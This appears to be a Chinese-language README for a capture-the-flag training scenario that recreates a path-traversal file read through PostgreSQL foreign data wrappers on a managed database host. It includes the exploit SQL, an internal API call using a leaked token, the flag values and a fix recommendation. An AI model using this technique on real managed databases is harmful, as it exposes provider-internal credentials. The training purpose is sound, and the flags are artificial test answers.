# CLOUD-13 RDS log_fdw：托管数据库宿主文件读取

## 场景信息

| 字段 | 值 |
|---|---|
| ID | CLOUD-13 |
| 名称 | RDS log_fdw: Managed DB Host File Read → Provider Internal Creds |
| 技术/CVE | N/A (log_fdw path traversal, case #015) |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10624 |

## 场景概述
托管 PostgreSQL 预装了 log_fdw（读数据库日志的扩展），但扩展对
filename 选项没有做路径约束，客户可以把它当任意文件读，跨过
"SQL 授权即边界"的错觉，读到宿主上供应商内部服务凭据。

## 教材锚点
- 案例：AWS RDS PostgreSQL log_fdw 任意文件读（#015）
- 平面：数据面（SQL）→ 失败边界：宿主机 VM
- 六镜头：BOUNDARY（真正的边界是宿主 VM 而非 SQL 授权）；
  IDENTITY（读到的是宿主机上 provider 内部身份）；DETECTION（DB 查询日志
  可见，但宿主文件读取在宿主层不可见）

## 前置知识
- PostgreSQL 扩展机制：CREATE SERVER / CREATE FOREIGN TABLE
- 托管数据库模型：客户拿到数据库角色，永远没有宿主 OS 账号

## 利用步骤
1. 在控制台执行（启用 file_fdw 已预置）：
   ```sql
   CREATE SERVER log_server FOREIGN DATA WRAPPER file_fdw;
   CREATE FOREIGN TABLE demo (t text) SERVER log_server
     OPTIONS (filename '/rdsdbdata/config/grover_volume.conf');
   SELECT * FROM demo;
   ```
2. 读出 `grover_volume.conf`，得到内部 token 与 flag1。
3. 用该 token 调用内部 API（经控制台 `/fetch`）：
   `/fetch?url=http://internal-api:5000/api&auth=grover-internal-credential-token`
   获得 flag2。

## Flag
- `flag{cloud-13-host-read}`（宿主配置文件）
- `flag{cloud-13-internal-api}`（内部存储 API）

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | PostgreSQL log_fdw and managed database host files |
| 侦察与前置条件 | Foreign-table log path behavior and provider internal file locations |
| 核心漏洞与利用 | Use log_fdw path traversal/file read |
| 权限、横向或影响 | Provider-internal credential disclosure |
| 验证 | Read the internal credential or flag file |

## 修复建议
FDW 的 filename 必须白名单限制在日志目录；宿主上不允许存放可被
数据库引擎进程读取的供应商内部凭据。
